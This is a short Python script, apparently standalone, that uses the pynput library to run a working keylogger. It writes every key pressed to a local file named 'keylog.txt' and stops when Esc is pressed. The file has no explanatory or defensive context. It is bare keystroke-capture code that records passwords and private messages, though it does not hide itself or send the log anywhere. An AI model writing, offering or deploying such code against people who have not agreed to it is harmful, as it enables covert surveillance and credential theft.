from pynput import keyboard

# Define the log file
log_file = "keylog.txt"

# Initialize the log
with open(log_file, "w") as file:
    file.write("Keylogger started...\n")

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" {key} ")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
